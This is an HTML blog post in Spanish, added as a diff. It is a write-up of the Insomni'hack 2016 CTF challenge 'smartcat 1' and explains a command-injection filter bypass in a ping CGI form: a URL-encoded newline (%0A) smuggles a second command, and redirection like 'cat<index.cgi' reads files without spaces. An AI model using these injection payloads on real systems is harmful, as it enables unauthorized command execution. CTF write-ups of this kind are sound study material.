@@ -1,0 +1,135 @@
+<html>
+    <head>
+        <title>b1gb1t</title>
+        <link href="/css/style.css" rel="stylesheet">
+        <link href="/css/doxy.css" type="text/css" rel="stylesheet" />
+        <script type="text/javascript" src="/js/prettify.js"></script>
+        <meta charset="utf-8"> 
+    </head>
+    <body onload="prettyPrint()">
+
+        <div class="container">
+
+            <div class="site-nav">
+
+            </div><!-- /.site-nav -->
+
+            <div class="site-header">
+                <div id="banner">
+                    <pre>
+$$           $$$\             $$           $$$\    $$\
+$$          $$$$ |            $$          $$$$ |   $$ |
+$$         $$ $$ |            $$         $$ $$ |$$$$$$$$\
+$$        $$ /$$ |            $$        $$ /$$ |\__$$  __|
+$$$$$$$$$\\_/ $$ | $$$$$$$$\  $$$$$$$$$\\_/ $$ |   $$ |
+$$   ___$$\   $$ |$$  ____$$\ $$   ___$$\   $$ |   $$ |
+$$  /   $$ |  $$ |$$ /    $$ |$$  /   $$ |  $$ |   $$ |
+$$ /    $$ |  $$ |$$/     $$ |$$ /    $$ |  $$ |   $$ |$$\
+\$$$$$$$$  |  $$ |\$$$$$$$$$ |\$$$$$$$$  |  $$ |   \$$$$  |
+ \________/   \_/  \______$$ | \________/   \_/     \____/
+                          $$ |
+                     $$   $$ |
+                     \$$  $$ |
+                      \$$$$  |
+                       \____/
+                    </pre>
+                </div>
+	    </div><!-- /.site-header -->
+
+            <div class="row">
+                <div class="nav-bar">
+                    --| <a href="/">Home</a> |--
+                </div><!-- /.nav-bar -->
+
+                <div class="blog-post">
+                    <h2 class="post-title">CTF - Insomni'hack - smartcat 1</h2>
+                    <p class="post-meta">by b1gb1t on January 20, 2016</p> 
+                    <p>Este es un CTF organizado por <a href="insomnihack.ch">Insomni&rsquo;hack</a>
+En especial, <strong>smartcat 1</strong> era de las pruebas con menor puntuación, pero me entretuvo bastante.</p>
+
+<p>El reto empezada con esta página: <a href="http://smartcat.insomnihack.ch/cgi-bin/index.cgi">http://smartcat.insomnihack.ch/cgi-bin/index.cgi</a></p>
+
+<p><img src="/images/smartcat1.png" alt="Smartcat 1" /></p>
+
+<p>Como se ve en la imágen, el input de la página enviaba su contenido al comando ping, así que era evidente que había que hacer un RCE.
+Lo malo es que el servidor detectaba ciertos carścteres necesarios para hacer la ejecución de comandos a partir del ping. Exactamente detectaba los siguientes caracteres: $;&amp;|({`\t y los espacios.</p>
+
+<p>Después de varios intentos se consiguio la ejecución de comandos añadiendo el valor de new line en hexadecimal, <strong>%0A</strong> , quedando así la petición:
+<!--?prettify lang=bsh linenums=false?-->
+<pre class="prettyprint">
+<a href="http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=%0Acomando_a_ejecutar">http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=%0Acomando_a_ejecutar</a>
+</pre></p>
+
+<p>Al hacer un &lsquo;ls&rsquo; se podía listar el fichero index.cgi y un directorio llamdo there (me faltan imágenes xD falta de costumbre de escribir writeups). Lo malo es que no se podía utilizar espacios, así que no podías hacer un &lsquo;ls there&rsquo; ni un &lsquo;cat fichero&rsquo;.
+Para solucionar la lectura hay que ayudarse de las redirecciones de flujo, &lt; y &gt;</p>
+
+<!--?pretify lang=bsh lnenums=false?-->
+
+<pre class="prettyprint">
+cat&lt;index.cgi
+</pre>
+
+<p>Problema!!! Con &lsquo;ls&rsquo; no funciona la redirección, asi que seguimos sin saber que hay en el directorio &lsquo;there&rsquo;.</p>
+
+<p><strong>SOLUCION:</strong> Utilizar otros comandos, por ejemplo, se puede utilizar el comando <strong>find</strong> o el comando <strong>du</strong>. En el caso del find mostrará el siguiente output:
+<!--?pretify lang=bsh lnenums=false?-->
+<pre class="prettyprint">
+find&lt;.
+</pre></p>
+
+<!--?pretify lang=bsh lnenums=false?-->
+
+<pre class="prettyprint">
+.
+./index.cgi
+./there
+./there/is
+./there/is/your
+./there/is/your/flag
+./there/is/your/flag/or
+./there/is/your/flag/or/maybe
+./there/is/your/flag/or/maybe/not
+./there/is/your/flag/or/maybe/not/what
+./there/is/your/flag/or/maybe/not/what/do
+./there/is/your/flag/or/maybe/not/what/do/you
+./there/is/your/flag/or/maybe/not/what/do/you/think
+./there/is/your/flag/or/maybe/not/what/do/you/think/really
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
+</pre>
+
+<p>Finalmente, se hace un cat del fichero flag y listo:
+INS{warm_kitty_smelly_kitty_flush_flush_flush}</p>
+
+                    <div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+var disqus_shortname = 'blgo'; // required: replace example with your forum shortname
+var disqus_identifier = '/2016/1/20/ctf-insomnihack2016-smartcat1/';
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function() {
+ var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+ dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+ (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+                </div><!-- /.blog-post -->
+
+            </div><!-- /.row -->
+
+        </div><!-- /.container -->
+        <div class="footer">
+            Powered by <a href="http://github.com/zlowram/blgo">blgo</a> 
+        </div><!-- /.footer -->
+    </body>
+</html>
